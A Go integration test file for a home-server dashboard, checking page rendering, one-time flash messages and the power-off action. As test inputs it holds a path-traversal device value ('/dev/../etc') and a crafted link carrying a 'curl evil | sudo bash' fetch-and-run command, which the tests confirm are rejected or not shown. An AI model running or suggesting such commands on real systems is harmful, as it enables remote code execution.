//go:build integration

package web_test

import (
	"net/url"
	"strings"
	"testing"

	"github.com/Rishikesh01/homeserver/hsctl/internal/itest"
	"github.com/Rishikesh01/homeserver/hsctl/internal/paths"
)

// TestPages renders every page of a set-up dashboard: each answers, and shows what it's for.
func TestPages(t *testing.T) {
	itest.NeedDocker(t)
	repo := configured(t)
	d := newDash(t, repo, nil)
	d.login()
	cases := []struct {
		path     string
		wantCode int
		want     []string
	}{
		{"/", 200, []string{"<title>Home server</title>", "Passwords", "https://10.0.0.5:8443", "Utilities"}},
		{"/help", 200, []string{"<title>Setup guide</title>", "10.0.0.5"}},
		{"/admin", 200, []string{"<title>Admin · Home server</title>", "10.0.0.5", "% busy", "GiB"}},
		{"/admin/commands", 200, []string{"<title>Command Center</title>", "Start all services", "Show status"}},
		{"/admin/apps", 200, []string{"<title>Apps</title>", "Passwords", "Switch on"}},
		{"/admin/updates", 200, []string{"<title>Updates</title>", "No check has run yet"}},
		{"/admin/devices", 200, []string{"<title>Drives</title>", "/mnt"}},
		{"/admin/terminal", 200, []string{"<title>Terminal</title>", "/admin/assets/xterm.js"}},
		{"/admin/backup", 200, []string{"<title>Backups</title>", repo.Path("backups", "restic"), "Backup password", "Nightly backups"}},
		{"/admin/backup/restore", 200, []string{"<title>Restore</title>", "RESTORE"}},
		{"/admin/backup/restore/progress?id=abc", 200, []string{"<title>Restoring…</title>", "abc"}},
		{"/admin/assets/xterm.js", 200, []string{"Terminal"}},
		{"/admin/assets/addon-fit.js", 200, []string{"FitAddon"}},
		{"/admin/assets/nope.js", 404, nil},
		{"/root.crt", 503, []string{"<title>Certificate not ready</title>"}},
		{"/nope", 404, nil},
		{"/setup", 303, nil}, // set up already: the wizard is closed
	}
	for _, tc := range cases {
		resp, body := d.get(tc.path)
		if resp.StatusCode != tc.wantCode {
			t.Errorf("%s = %d\n%s", tc.path, resp.StatusCode, body)
			continue
		}
		for _, w := range tc.want {
			if !strings.Contains(body, w) {
				t.Errorf("%s lacks %q", tc.path, w)
			}
		}
	}
	// With the CA saved, it's served as a download.
	itest.WriteFile(t, repo.Root, paths.CACert, "-----BEGIN CERTIFICATE-----\nx\n-----END CERTIFICATE-----\n")
	resp, body := d.get("/root.crt")
	if resp.StatusCode != 200 || resp.Header.Get("Content-Type") != "application/x-x509-ca-cert" || !strings.HasPrefix(body, "-----BEGIN") {
		t.Errorf("/root.crt = %d %q", resp.StatusCode, resp.Header.Get("Content-Type"))
	}
	// Switched-off apps' tiles are hidden from the home page.
	_, body = d.get("/")
	if strings.Contains(body, "https://10.0.0.5:8444") {
		t.Error("the switched-off Nextcloud still has a tile")
	}
}

// TestFlash: an action's result is carried to the next page in a cookie and shown once; a crafted
// ?msg= link puts nothing on the page.
func TestFlash(t *testing.T) {
	d := newDash(t, itest.Repo(t), nil)
	d.login()
	steps := []struct {
		name     string
		do       func() (int, string)
		wantCode int
		want     string
		notWant  string
	}{
		{"an action redirects", func() (int, string) {
			resp, body := d.post("/admin/devices/mount", url.Values{"dev": {"/dev/../etc"}})
			if resp.Header.Get("Location") != "/admin/devices" {
				return 0, body
			}
			return resp.StatusCode, body
		}, 303, "", ""},
		{"the next page shows the result", func() (int, string) {
			resp, body := d.get("/admin/devices")
			return resp.StatusCode, body
		}, 200, "Mount failed: device &#34;/dev/../etc&#34; is not an attached block device", ""},
		{"only once", func() (int, string) {
			resp, body := d.get("/admin/devices")
			return resp.StatusCode, body
		}, 200, "", "Mount failed"},
		{"a crafted link shows nothing", func() (int, string) {
			resp, body := d.get("/admin/devices?msg=Run+curl+evil+|+sudo+bash")
			return resp.StatusCode, body
		}, 200, "", "curl evil"},
	}
	for _, st := range steps {
		code, body := st.do()
		if code != st.wantCode || !strings.Contains(body, st.want) || (st.notWant != "" && strings.Contains(body, st.notWant)) {
			t.Fatalf("%s: %d\n%s", st.name, code, body)
		}
	}
}

// TestAction: the power-off button only takes a POST with that exact action. (It is never pressed
// here: it would power the machine off.)
func TestAction(t *testing.T) {
	d := newDash(t, itest.Repo(t), nil)
	d.login()
	cases := []struct {
		name     string
		method   string
		form     url.Values
		wantCode int
	}{
		{"GET goes back to admin", "GET", nil, 303},
		{"unknown action", "POST", url.Values{"do": {"reboot-into-something"}}, 400},
	}
	for _, tc := range cases {
		resp, body := d.do(tc.method, "/admin/action", tc.form, nil)
		if resp.StatusCode != tc.wantCode {
			t.Errorf("%s: %d %s", tc.name, resp.StatusCode, body)
		}
	}
}
